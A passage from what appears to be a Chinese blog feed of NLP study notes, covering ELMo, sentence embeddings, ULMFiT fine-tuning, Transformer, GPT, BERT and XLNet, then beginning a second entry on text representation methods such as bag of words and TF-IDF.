h\right)}, h=L S T M\left(t_{k} | t_{1}, \ldots,t_{k-1}\right)\]</span> ​ char-based CNN模型是现成已有的，对于任意一个目标词都可以得到一个向量表示 CNN(<span class="math inline">\(t_k\)</span>) 。利用 CNN 解决有三点优势:</p><blockquote><ol type="1"><li>CNN 能减少做 Softmax 时全连接层中的必须要有的 |V|* h的参数规模，只需保持 CNN 内部的参数大小即可。 (PS: 卷积核参数共享)</li><li>CNN 可以解决 OOV（Out-of-Vocabulary）问题，这个在翻译问题中尤其头疼</li><li>在预测阶段，CNN 对于每一个词向量的计算可以预先做好，更能够减轻inference 阶段的计算压力。</li></ol></blockquote><h4><span id="输入层">输入层：</span></h4><p>​ 相似结构，不同输出。训练时间会略微增加，因为原来的 look-up操作可以做到更快一些。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225162958568.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:60%;"></p><p>​ 句子中每个单词都能得到对应的三个Embedding:</p><p>​ 最底层是单词的WordEmbedding，往上走是第一层双向LSTM中对应单词位置的Embedding，这层编码单词的句法信息更多一些；再往上走是第二层LSTM中对应单词位置的Embedding，这层编码单词的语义信息更多一些。</p><h4><span id="结果">结果：</span></h4><p>​ 有三层的词向量可以利用：</p><ul><li><p>输入层 CNN 的输出，即是 LSTM 的输入向量，</p></li><li><p>第一层 LSTM 的hiddenstate：这层编码单词的句法信息更多一些</p></li><li><p>第二层的hidden state：这层编码单词的语义信息更多一些</p><p>LSTM 是双向的，因此对于任意一个词，如果 LSTM 的层数为 L的话，总共可获得的向量个数为 2L+1。</p></li></ul><p>​ 对于每一个词，可以根据下面的式子得到它的向量，其中 γ 是一个 scale因子，加入这个因子主要是想将 ELMo的向量与具体任务的向量分布拉平到同一个分布水平： <span class="math display">\[\mathbf{E} \mathbf{L} \mathbf{M} \mathbf{o} k^{t a s k}=\gamma^{t a s k}\sum j= s_{j}^{t a s k} \mathbf{h}_{k, j}\]</span></p><blockquote><p><span class="math inline">\(\mathbf{h}_{k,j}\)</span>便是针对每一层的输出向量，利用一个 softmax的参数来学习不同层的权值参数<span class="math inline">\(s_{j}^{t a sk}\)</span>，因为不同任务需要的词语意义粒度也不一致，一般认为浅层的表征比较倾向于句法，而高层输出的向量比较倾向于语义信息。</p><p>因此通过一个 softmax 的结构让任务自动去学习各层之间的权重。</p></blockquote><h3><span id="计算复杂度">计算复杂度</span></h3><p>​ <strong>基于传统统计的 N-gram 还是普通神经网络的 NNLM结构</strong>，都会有一个很严重的问题，那就是计算复杂度随着上下文窗口 N大小的增大急剧上升。 N-gram 是指数上升；NNLM 是以 |d| × N的形式增加。</p><p>​ <strong>CBOW 和 Skip-gram 以及再后来的 GloVe</strong>终于做到了计算复杂度与所选窗口大小无关，<strong>BUT</strong>只是预测单个词的计算时间复杂度，如果是求整个输入序列的话，还是避免不了要与序列长度相关。</p><blockquote><p>​ 这几种方法（N-gram, ...,GloVe），它们都受限于所使用的模型表征能力，<strong>某种意义上都只能得到比较偏上下文共现意义上的词向量，并且也很少考虑过词序对于词的意义的影响</strong>。</p></blockquote><p>​</p><p>​ RNN 结构的计算复杂度：</p><ol type="1"><li><p>纵向上主要是 RNN 结构本身的时间复杂度</p><ol type="1"><li>RNN 结构内部的 hidden state 维度</li><li>模型结构的复杂度</li><li>在 ELMo中的话还跟词典大小相关（因为最后一层还是一个词典大小上的分类问题，以及输入也需要维护一个词典大小的loop up 操作）</li></ol><p>但是在机器性能提升的情况下，这一部分至少不是阻碍词向量技术发展的最关键的因素了</p></li><li><p>横向上的计算复杂度，就主要是受制于输入序列的长度</p><ol type="1"><li>RNN结构本身因为在时间序列上共享参数，其自身计算复杂度这一部分不变</li><li>输入序列长度</li></ol></li></ol><h2><span id="从词向量到句子向量">从词向量到句子向量</span></h2><ul><li>无监督句子表示：将句子表示成定长向量</li><li>基线模型：word2vec</li><li>模型：AE(Auto Encoder)，LM(language model)，Skip-Thoughts等<ul><li>本身的信息</li><li>上下文的信息</li><li>任务的信息</li></ul></li></ul><h3><span id="pv-dm-和-pv-dbow">PV-DM 和 PV-DBOW</span></h3><p>​ PV-DM 的全称是 Distributed Memory Model of Paragraph Vectors：</p><p>​类似CBOW，输入=&gt;&gt;文档向量+上下文向量；输出=&gt;&gt;下一个词向量。有新文档需要再走一遍训练流程</p><p>​ PV-DBOW 的全称则是 Distributed Bag of Words version of ParagraphVector</p><p>​ 和 Skip-gram类似，通过文档来预测文档内的词，训练的时候，随机采样一些文本片段，然后再从这个片段中采样一个词，让PV-DBOW 模型来预测这个词。</p><blockquote><p>From Mikolov et al. experiment, <strong>PV-DM is consistently betterthan PV-DBOW</strong>.</p><p><strong>Concatenation way is often better</strong> than sum/average.</p></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225171449837.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 问题：很难去表征词语之间的更丰富的语义结构</p><h3><span id="skip-thoughts">Skip-thoughts</span></h3><p>​ Skip-thoughts 直接在句子间进行预测，也就是将 Skip-gram中以词为基本单位，替换成了以句子为基本单位</p><p>​具体做法就是选定一个窗口，遍历其中的句子，然后分别利用当前句子去预测和输出它的上一句和下一句</p><blockquote><p>对于句子的建模利用的 RNN 的 sequence结构，预测上一个和下一个句子时候，也是利用的一个 sequence 的 RNN来生成句子中的每一个词，所以这个结构本质上就是一个 Encoder-Decoder框架，只不过和普通框架不一样的是，Skip-thoughts 有两个 Decoder。</p></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225171721324.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="quick-thoughts">Quick-thoughts</span></h3><p>​ 解决Skip-thoughts中RNN训练太慢的问题</p><p>​ 把 Skip-thoughts的生成任务改进成为了一个<strong>分类任务</strong>，具体说来就是把同一个上下文窗口中的句子对标记为正例，把不是出现在同一个上下文窗口中的句子对标记为负例，并将这些句子对输入模型，让模型判断这些句子对是否是同一个上下文窗口中，很明显，这是一个分类任务。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225171829882.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="infersent">InferSent</span></h3><p>​ 思想特别简单，先设计一个模型在斯坦福的 SNLI（Stanford NaturalLanguageInference）数据集上训练，而后将训练好的模型当做特征提取器，以此来获得一个句子的向量表示，再将这个句子的表示应用在新的分类任务上，来评估句子向量的优劣。</p><p>​ 进行多任务学习，不同任务使得模型学习到不同特征的提取能力。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225172034586.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:60%;"></p><h3><span id="general-purposesentence-representation">General PurposeSentence Representation</span></h3><p>​ 有很多相似的研究：</p><p>​ Learning General Purpose Distributed Sentence Representations viaLarge Scale Multi-taskLearning，就提出了利用四种不同的监督任务来联合学习句子的表征，这四种任务分别是：NaturalLanguage Inference，Skip-thougts，Neural Machine Translation 以及Constituency Parsing 等</p><p>​训练结束后，将<strong>模型的输出作为句子的表征</strong>（或者把这个联合学习的模型作为特征提取器），然后直接在这个表征上接上非常简单的全连接层做分类器，并且同时<strong>保证最底层的特征提取器中参数不动</strong>（也就是只把它当做特征提取器），再在新的分类任务上做训练（只训练最后接上的全连接层分类器），最后根据训练出来的简单分类器在各自分类任务的测试集上做评估。</p><h3><span id="universal-sentence-encoder">Universal Sentence Encoder</span></h3><p>​ 思路类似General Purpose SentenceRepresentation，只不过作者提出了利用 Transformer 和 DAN（上文提到过的和CBOW 相似， *<strong>Deep Unordered Composition Rivals Syntactic Methodsfor Text Classification*</strong>）两种框架作为句子的 Encoder。</p><blockquote><ul><li>Transformer结构更为复杂，参数更多，训练也相对比较耗时，但是一般来说效果会更好一些。</li><li>DAN结构简单，只有两个隐藏层（甚至可以减小为只需要一个隐藏层），参数比较少，训练相对比较省时省资源，但是一般来说效果会差一些（并不是绝对，论文中也发现某些场景下DAN 的效果甚至更好）。</li></ul></blockquote><p>​作者既在无标记数据上训练，也在监督数据上训练，最后在十个分类任务上进行迁移学习的评估。</p><p>​ 作者还放出了他们预训练好的Encoder，可以供迁移学习的句子特征提取器使用。</p><blockquote><p>预训练Encoder：https://tfhub.dev/google/universal-sentence-encoder/2</p></blockquote><h2><span id="ulmfit">ULMFit</span></h2><p>​ <strong>Universal Language Model Fine-tuning for TextClassification</strong> 中，提出了ULMFit结构，其实这本质上是他们提出的一个方法，而不是具体的某种结构或模型。主要应用于文本分类问题中。</p><p>​ ULMFiT 最终在分类任务上表现惊艳，尤其是只需要 100个标记数据，就能够学习到一个表现非常 comparable 的分类器。</p><p>​ 和ELMo基本思路类似，也是预训练完成后在具体任务上进行finetune，但不同之处也有很多。</p><p>​ 分为三个阶段：</p><blockquote><ul><li>大规模预训练</li><li>任务数据预训练</li><li>接任务模型部分再次finetune</li></ul></blockquote><p>​ <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225173609647.png" srcset="/img/loading.gif" lazyload alt="image"></p><h3><span id="averaged-sgd">Averaged SGD</span></h3><p>​ Averaged SGD 是指先将模型训练到一定epoch，然后再将其后的每一轮权值进行平均后，得到最终的权值。 <span class="math display">\[w_{k+1}=w_{k}-\gamma_{k} \nabla f\left(w_{k}\right)\]</span> 变成 <span class="math display">\[w=\frac{1}{K-T+1} \sum_{i=T}^{K} w_{i}\]</span></p><blockquote><p>​ T 是一个阈值，而 K是总共的迭代次数，这个式子的意思就是<strong>把迭代到第 T次之后，对该参数在其后的第 T轮到最后一轮之间的所有值求平均，从而得到最后模型的该参数值</strong>。</p></blockquote><h3><span id="dropconnect">DropConnect</span></h3><p>​ LSTM上一个时刻和下一个时刻之间的隐藏层之间是有连接的，并且这个连接通过一个全连接的矩阵相连，而这个模型则用了DropConnect 的方法随机 drop掉一些连接，从而减少了一些过拟合的风险，当然在输入层到隐藏层之间也有正常的dropout 操作。</p><h3><span id="微调的技巧两次-finetune">微调的技巧(两次 finetune)</span></h3><h4><span id="1-discriminative-fine-tune">1. discriminative fine-tune</span></h4><p>​ 不同层在训练更新参数的时候，赋予不同的学习率。</p><p>​不同层的表征有不同的物理含义，比如浅层偏句法信息，高层偏语义信息，因此对于不同层的学习率不同。<span class="math display">\[\theta_{t}^{l}=\theta_{t-1}^{l}+\eta^{l} \nabla_{\theta^{l}} J(\theta)\]</span></p><p><span class="math display">\[\eta^{l-1}=\frac{\eta^{l}}{2.6}\]</span></p><h4><span id="2-slanted-triangularlearning-rates">2. slanted triangularlearning rates</span></h4><blockquote><ol type="1"><li>在 finetune的第一阶段，希望能够先稳定住原来已经在大规模语料集上预训练好的参数，选择比较小的 finetune 学习率</li><li>后逐步加大学习率，使得学习过程能够尽量快速。</li><li>当训练接近尾声时，逐步减小学习率，这样让模型逐渐平稳收敛。</li></ol><p>计算：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225175353963.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>T -- the number of training iterations； cut_frac -- the fraction ofiterations we increase lr； cut -- the iteration when we switchfromincreasing to decreasing the lr; p -- the fraction ofthe number ofiterations we have increased or willdecrease the LR respectively; ratio-- specifies how much smaller the lowest lr is from the maximum lr <span class="math inline">\(η_{max}\)</span></p><p>一般取：cut_frac= 0.1, ratio= 32 and <span class="math inline">\(η_{max}\)</span>= 0.01</p></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225175048788.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="gradual-unfreezing">gradual unfreezing</span></h3><p>​ 预训练模型在新任务上 finetune 时，<strong>逐层解冻模型</strong>，先finetune 最后一层，然后再解冻倒数第二层，把倒数第二层和最后一层一起finetune，然后再解冻第三层。以此类推，逐层往浅层推进，最终 finetune整个模型或者终止到某个中间层。这样做的目的也是为了 finetune过程能够更平稳。</p><h2><span id="transformer">Transformer</span></h2><p>​ 因为 Self-attention 的存在，才使得 Transformer在做类似翻译问题的时候，可以让其 Encoder不用做序列输入，而是将整个序列一次全输入，并且超长序列的输入也变得可能。而具体到Self-attention 中，可以用下图表示。<a href="https://jalammar.github.io/illustrated-transformer/">优质Blog</a></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225164948350.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ Self-attention中的<strong>多头机制</strong>便是将这样的操作分别进行多次，让句子的表征充分学习到不同的侧重点，最终将这些多头学习出来的表征concat 到一起，然后再同一个全连接网络，便可以得到这个句子最终Self-attention 下新的表示。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225165354702.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><blockquote><p>​ 训练时： Decoder 中的输入可以用矩阵形式一次完成当前整个序列的 decode过程，因为 ground truth 已经提前知道，只需做好每个词的 mask 就好</p><p>​ inference 的时候：Decoder必须按照序列输入，因为在生成每一个词的时候，必须先生成它的前一个词，无法一次将整个序列全部生成</p></blockquote><p>Decoder 的 attention 实际包含两部分：</p><ol type="1"><li>第一部分是带有 mask 的 Self-attention，通过 mask 将 decode 阶段的attention 限定只会 attention 到已经生成过的词上，因此叫做 MaskSelf-attention。</li><li>第二部分是普通的 Self-attention 操作，不过这时的 K 和 V矩阵已经替换为 Encoder 的输出结果，所以本质上并非一个Self-attention。</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225165429652.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 结构展示：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225165500944.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:75%;"></p><p>​ <a href="https://github.com/RacleRay/DeepLearningFoundation/blob/master/2.0-Transformer.ipynb">Code</a></p><h2><span id="gpt">GPT</span></h2><p>​ GPT 使用的 Transformer 是只用了Decoder，因为对于语言模型来讲，确实不需要 Encoder 的存在。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225180846077.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 要做超长的序列输入（可以长达 11000个词），为了能够高效节省时间和内存的处理如此长的序列，做了一些Memory-Compressed 工作，主要是两方面：</p><blockquote><ol type="1"><li>通过 CNN 操作，把 K 和 V 压缩到序列长度更小的一个矩阵，同时保持 Q不变，这样也能在相当程度上减少计算量</li><li>把一个 batch 内部的序列按长度进行分组，然后分别在每个组内部进行self-attention 操作，避免将一些很短的句子也 padding到整个语料的最大长度；</li></ol></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225180432672.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 利用语言模型的目标函数预训练完成后，便可以在具体任务上进行finetune，和 ULMFiT 中的 finetune 分为两个阶段的方法不一样的是，GPT直接把这两个过程糅合到一个目标函数中： <span class="math display">\[L_{3}(C)=L_{2}(C)+\lambda L_{1}(C)\]</span> ​ 其中 L2 是 task-specific 的目标函数， L1则是语言模型的目标函数。论文中说这种联合学习方式能够让训练效果更好。</p><p>改造任务类型：</p><ul><li>分类问题：直接在原序列的开始和末尾添加表示开始和末尾的符号，</li><li>Text Entailment 问题：将 Premise 和 Hypothesis通过一个中间分隔符“$”连接起来成为一个序列，然后同样在开头和末尾添加标记符号。</li><li>文本相似问题：因为序列 1 和序列 2没有先后关系，因此将先后关系相反的两个序列作为输入。</li><li>Question Aswering ：将 query 和每个候选的 answer都分别连接成一个序列作为输入，最后按各自的打分进行排序。</li></ul><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225181341481.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 对输入数据结构进行一定处理。</p><h2><span id="bert">BERT</span></h2><p>​ Bidirectional Encoder Representation fromTransformers，进一步完善和扩展了 GPT 中设计的通用任务框架，使得 BERT能够支持包括：句子对分类任务、单句子分类任务、阅读理解任务和序列标注任务。</p><h3><span id="模型特点">模型特点</span></h3><h4><span id="1-利用了真双向的-transformer">1. 利用了真双向的 Transformer</span></h4><ul><li><p>Encoder 中用了 Self-attention机制，而这个机制会将每一个词在整个输入序列中进行加权求和得到新的表征<br></p></li><li><p>更多的 transformer 的 block（意味着经过更多Self-attention），那么互相交融的程度将会更高（Base 模型是 12层，Large模型是 24层）<br></p></li><li><p>Large 版本 BERT 的多头机制中 Head 个数多达 16个，多种关系的学习</p></li><li><p>ELMo 与 GPT 本质上还是一个单向的模型，ELMo稍微好一点，将两个单向模型的信息 concat起 来。GPT 则只用了单向模型，Decdoer的天生基因决定的。显然句子中有的单词的语义会同时依赖于它左右两侧的某些词，仅仅从单方向做encoding是不能描述清楚的。</p></li></ul><h4><span id="2-mask-lm-mask-languagemodel">2. Mask-LM (Mask-LanguageModel)</span></h4><p>​ 将单向预测的LM改变为双向的LM，预测目标变为什么？</p><p>​ 为了利用双向信息，改进了普通语言模型成为完形填空式的 Mask-LM(Mask-Language Model)，随机选取15%的词进行Mask，然后预测。</p><blockquote><ul><li>输入序列依然和普通Transformer保持一致，只不过把挖掉的一个词用"[MASK]"替换</li><li>输出层在被挖掉的词位置，接一个分类层做词典大小上的分类问题，得到被mask 掉的词概率大小</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225183125560.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><p>​ BERT 针对如何做“[MASK]”，做了一些更深入的研究，它做了如下处理：</p><blockquote><ol type="1"><li><p>选取语料中所有词的 15% 进行随机 mask；</p></li><li><p>选中的词在 80% 的概率下被真实 mask；</p></li><li><p>选中的词在 10% 的概率下不做mask，而被随机替换成其他一个词；</p></li><li><p>选中的词在 10% 的概率下不做 mask，仍然保留原来真实的词。</p></li></ol></blockquote><h4><span id="3-next-sentenceprediction-任务学习句子级别信息">3. Next SentencePrediction 任务学习句子级别信息</span></h4><p>​具体做法则是将两个句子组合成一个序列，组合方式会按照下面将要介绍的方式，然后让模型预测这两个句子是否为先后近邻的两个句子，也就是会把"NextSentence Prediction"问题建模成为一个二分类问题。</p><p>​ 句子级负采样：</p><p>​ 训练的时候，数据中有 50% 的情况这两个句子是先后关系，而另外 50%的情况下，这两个句子是随机从语料中凑到一起的，也就是不具备先后关系，以此来构造训练数据。</p><p>​ Multi-task:</p><p>​ 在预训练阶段，因为有两个任务需要训练：Mask-LM 和 Next SentencePrediction</p><h3><span id="输入表示">输入表示</span></h3><p>​ <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225183803276.png" srcset="/img/loading.gif" lazyload alt="image"></p><ul><li>起始标记都用“[CLS]”来表示，结束标记符用"[SEP]"表示，对于两个句子的输入情况，除了起始标记和结束标记之外，两个句子间通过"[SEP]"来进行区分。</li><li>用两个向量表示当前是句子 A 或句子 B 的。引入了“segmentembedding”的概念来区分句子。</li><li>引入序列中词的位置信息，也用了 positionembedding。和Transformer的sin、cos函数编码不同，直接去<strong>训练了一个positionembedding</strong>。给每个位置词一个随机初始化的词向量，再训练。</li></ul><p>[CLS]作为句子/句对的表示是直接跟分类器的输出层连接的。</p><h3><span id="下游任务">下游任务</span></h3><p>​ NLP的四大任务：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225184340110.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:40%;"></p><ol type="1"><li>对于<strong>单序列文本分类任务和序列对的文本分类任务</strong>使用框架基本一致，利用Encoder 最后一层的第一个时刻“[CLS]”对应的输出作为分类器的输入</li><li>对于 <strong>SQuAD 1.1任务</strong>来说，需要在给定段落中找到正确答案所在区间，这段区间通过一个起始符与终止符来进行标记</li><li><strong>序列标注任务</strong>上进行 finetune，对于序列中的每个 token而言，实际上就是一个分类任务。和前面提到的普通分类任务不一样的是，这里的分类需要针对序列中的每个词做分类，参数增加在H × K ，这里的 K 是序列标注中标注的种类个数。</li><li>对于 SWAG任务来讲，因为需要在给定一个句子后，从四个候选句子中选择一个最有可能是该句子的下一个句子，这里面通常包含了一些常识推理。将前置句子和四个候选句子分别进行组合成一个句子对,给每一个候选句子进行打分，从而得到四个候选句子中最有可能是下一个的句子。</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225184423666.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 对比参数及训练</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225184712741.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h2><span id="xlnet">XLNet</span></h2><p>​在两阶段新模式（预训练+Finetuning）下，应该会有更多的好工作涌现出来。根本原因在于：这个模式的潜力还没有被充分挖掘，貌似还有很大的提升空间。</p><p>​ XLNet引入了自回归语言模型以及自编码语言模型的方法。</p><h3><span id="自回归语言模型autoregressivelm">自回归语言模型（AutoregressiveLM）</span></h3><p>​自左向右预测下一个词的语言模型任务，或者反过来自右向左，这种类型的LM被称为自回归语言模型。</p><p>​ GPT就是典型的自回归语言模型。ELMo是分别有两个方向的自回归LM，然后把LSTM的两个方向的隐节点状态拼接到一起，体现双向语言模型。其实是两个自回归语言模型的拼接，本质上仍然是自回归语言模型。</p><h4><span id="优点">优点</span></h4><ol type="1"><li>下游NLP任务有关，比如生成类NLP任务，文本摘要，机器翻译等，在实际生成内容的时候，就是从左向右的，自回归语言模型天然匹配这个过程。</li><li>Bert这种DAE模式，在生成类NLP任务中，就面临训练过程和推断过程（没有Mask）不一致的问题，导致生成类的NLP任务到目前为止都做不太好。</li></ol><blockquote><p>PS：</p><ol type="1"><li>DAE（DA Enhanced），DenoisingAutoencoder：那些被Mask掉的单词就是在输入侧加入的所谓噪音。类似Bert这种预训练模式，被称为DAELM</li><li>AoA, 层叠式注意力机制（Attention-over-Attention）</li></ol></blockquote><h4><span id="缺点">缺点</span></h4><p>​只能利用上文或者下文的信息，不能同时利用上文和下文的信息，但是这在sequenceinference这类任务中却更符合实际。ELMo这种双向都做，因为融合模式过于简单，所以效果其实并不是太好。</p><blockquote><p>​ GPT 2.0的作者却坚持沿用GPT 1.0单向语言模型的旧瓶，装进去了更高质量更大规模预训练数据的新酒。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200226210601999.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​而它的实验结果也说明了，如果想改善预训练语言模型，走这条扩充预序列模型训练数据的路子，是个多快好但是不省钱的方向。</p></blockquote><h3><span id="自编码语言模型autoencoderlm">自编码语言模型（AutoencoderLM）</span></h3><p>​ DAELM的优缺点正好和自回归LM反过来，它能比较自然地融入双向语言模型。</p><p>​Bert的缺点，主要在输入侧引入[Mask]标记，导致预训练阶段和Fine-tuning阶段不一致的问题，因为Fine-tuning阶段是看不到[Mask]标记的。</p><p>​ XLNet的出发点就是：</p><blockquote><ol type="1"><li>能否融合自回归LM和DAE LM两者的优点。</li><li>另外一个是，Bert在第一个预训练阶段，假设句子中多个单词被Mask掉，这些<strong>被Mask掉的单词之间没有任何关系，是条件独立的</strong>，而有时候这些单词之间是有关系的，XLNet则考虑了这种关系</li></ol></blockquote><p>​ XLNet共有三个因素：</p><ol type="1"><li>Permutation LanguageModel(简称PLM)：将双向信息学习方式，由预测[Mask]，变成对序列进行全排列，根据每种可能排序由前t- 1个词预测第t个词。来融入双向语言模型。</li><li>引入了Transformer-XL：相对位置编码以及分段RNN机制。相对位置编码关注相对位置偏差。分段RNN机制，将长文本划分为较短的文本输入transformer，将transformer单元作为RNN的cell，进行RNN方式的序列运算连接。</li><li>增加了预训练阶段使用的数据规模：Bert使用的预训练数据是BooksCorpus和英文Wiki数据，大小13G。XLNet除了使用这些数据外，另外引入了Giga5，ClueWeb以及CommonCrawl数据，并排掉了其中的一些低质量数据，大小分别是16G,19G和78G。可以看出，在预训练阶段极大扩充了数据规模，并对质量进行了筛选过滤。</li></ol><p>​对于长文档的应用，Bert因为<strong>Transformer天然对长文档任务处理有弱点</strong>，所以XLNet对于长文档NLP任务相比Bert应该有直接且比较明显的性能提升作用，它在论文中也证明了这点。</p><h2><span id="总结">总结</span></h2><p>​ 如何使用这些预训练好的模型。一般来说，可以有三种方式来使用：</p><ol type="1"><li><p>将预训练模型当做一个特征提取器，直接将预训练模型的输出层去掉，然后使用去掉输出层之后的最后一层输出作为特征，输入到我们自己精心设计好的Task-specific 模型中去。</p><blockquote><div class="hljs code-wrapper"><pre><code>   在训练过程中，作为特征提取器的部分（比如 BERT Encoder）的参数是不变的。</code></pre></div></blockquote></li><li><p>将预训练模型整体接入 Task-specific模型，继而重新在新的数据集上整体重新训练。</p><blockquote><div class="hljs code-wrapper"><pre><code>   当然训练技巧可以有很多种，比如 ULMFiT 的三角学习率和逐层解冻或者是 Transformer 的 warmup 策略（上文都有提到），这些训练技巧非常重要，需要好好把控，否则很容易学崩了，甚至让原有预训练语言模型的优势都被新的 finetune 抹去了，因此需要实验设计一个比较好的 finetune 策略。</code></pre></div></blockquote></li><li><p>保留预训练模型的一部分，另外一部分则和 Task-specific 模型一起finetune。</p><blockquote><div class="hljs code-wrapper"><pre><code>   训练数据不算太多的情况，这个时候一方面要保证预训练模型在大规模语料上曾经学习到的表征，另一方面因为又要做新数据下的迁移，但是数据量比较少，重新 finetune 整个模型可能不太合适，容易导致模型的鲁棒性不高，那么似乎选择最后的一些层进行选择性的 finetune 会是比较好的方案</code></pre></div></blockquote></li></ol><p>​ 以 BERT为代表的模型，简单粗暴，与人类语言习得过程中的轻量、泛化和低功耗截然相反。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BERT </tag>
            
            <tag> representation </tag>
            
            <tag> pretrained LM </tag>
            
            <tag> XLNet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本表示</title>
      <link href="/posts/2af352b4.html"/>
      <url>/posts/2af352b4.html</url>
      
        <content type="html"><![CDATA[<h1><span id="文本表示">文本表示</span></h1><p>​计算机做不到直接对文本字符串进行语义理解和表示，因此需要进行数值化或者向量化。良好的文本表示形式可以极大的提升机器学习算法效果。</p><h2><span id="1表示方法">1.表示方法</span></h2><ul><li>离散表示<ul><li>one-hot表示</li><li>multi-hot表示</li></ul></li><li>分布式表示<ul><li>基于矩阵<ul><li>基于降维的方法</li><li>基于聚类的方法</li></ul></li><li>基于神经网络<ul><li>CBOW</li><li>Skip-gram</li><li>NNLM</li><li>C&amp;W</li></ul></li></ul></li></ul><h2><span id="2文本离散表示">2.文本离散表示</span></h2><h3><span id="bag-of-words">bag of words</span></h3><p>​ 将字符串视为一个 <strong>“装满字符（词）的袋子”</strong> ，袋子里的<strong>词语是随便摆放的</strong>。</p><p>​ [1,0,1,1,1,0,0,1,…] --向量的<strong>每个维度唯一对应着词表中的一个词</strong>。可见这个向量的大部分位置是0值，这种情况叫作<strong>“稀疏”</strong>。为了减少存储空间，我们也可以只储存非零值的位置。</p><h4><span id="优缺点">优缺点</span></h4><p>优点：</p><ol type="1"><li>简单，方便，快速</li><li>在语料充足的前提下，对于简单的自然语言处理任务效果不错。如文本分类。</li></ol><p>缺点：</p><ol type="1"><li>其准确率往往比较低。凡是出现在文本中的词一视同仁，不能体现不同词在一句话中的不同的重要性。</li><li><strong>无法关注词语之间的顺序关系，这是词袋子模型最大的缺点</strong>。如“武松打老虎”跟“老虎打武松”在词袋子模型中是认为一样的。</li></ol><h3><span id="tf-idf">TF-IDF</span></h3><p>​ 词频——TF（term frequency）：在当前文档中的词频</p><p>​统计逆文档频率——IDF：基本假设是<strong>如果一个词语在不同的文档中反复出现，那么它对于识别该文本并不重要</strong>。</p><p>​ <span class="math display">\[-log({出现该词语的文档占总文档出现的频率})\]</span></p><p>​IDF可以进行平滑：假设存在一个文档，包含所有的词。计算IDF时，分子分母都加一。</p><h2><span id="3文本分布式表示">3.文本分布式表示</span></h2><p>​ one-hotvector：假设我们的词库总共有n个词，那我们开一个1*n的高维向量。</p><p>​ <span class="math display">\[ w^{aardcark}=\begin{bmatrix}​     1  \\​     0  \\​     0 \\​     \vdots \\​     0\end{bmatrix} ,w^{a}=\begin{bmatrix}​     0  \\​     1  \\​     0 \\​     \vdots \\​     0\end{bmatrix}\]</span></p><p>​ 向量没办法给我们任何形式的词组相似性权衡。例如:</p><p>​ <span class="math display">\[(w^{hotel})^Tw^{motel}=0\]</span></p><p>​一个极高维度的空间，然后每个词语都会占据一个维度，因此没有办法在空间中关联起来。</p><h3><span id="基于svd降维的表示方法">基于SVD降维的表示方法</span></h3><p>​ 建立一个词组文档矩阵<span class="math 